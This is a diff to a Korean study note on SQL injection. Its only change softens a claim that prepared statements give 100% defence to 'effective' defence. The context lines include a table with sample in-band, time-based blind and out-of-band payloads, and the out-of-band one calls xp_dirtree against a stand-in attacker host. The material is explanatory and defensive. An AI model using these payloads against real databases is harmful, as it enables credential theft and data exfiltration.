@@ -68,7 +68,7 @@ SQL Injection은 공격 메커니즘과 정보 획득 방식에 따라 인밴드
 | 필요 전제 조건 | 화면에 쿼리 결과나 에러 메시지 렌더링 | 참/거짓에 따른 미세한 시스템 응답 변화 | DBMS의 외부 네트워크 통신 권한 개방 |
 | 주요 페이로드 | ' UNION SELECT null, id, pw FROM users-- | 1' AND IF(ascii(substr(db,1,1))=97,sleep(5),0)-- | '; EXEC master..xp_dirtree '\\attacker.com\a'-- |
 
-- SQL 인젝션은 가장 파괴적인 웹 취약점이나, 원천적인 방어책인 정적 매개변수화(PreparedStatement)를 코드 작성 단계에 철저히 적용하면 100% 방어가 가능함.
+- SQL 인젝션은 가장 파괴적인 웹 취약점이나, 원천적인 방어책인 정적 매개변수화(PreparedStatement)를 코드 작성 단계에 철저히 적용하면 효과적으로 방어 가능함.
 
 ## Ⅳ. SQL Injection의 주요 한계점 및 해결 방안
 
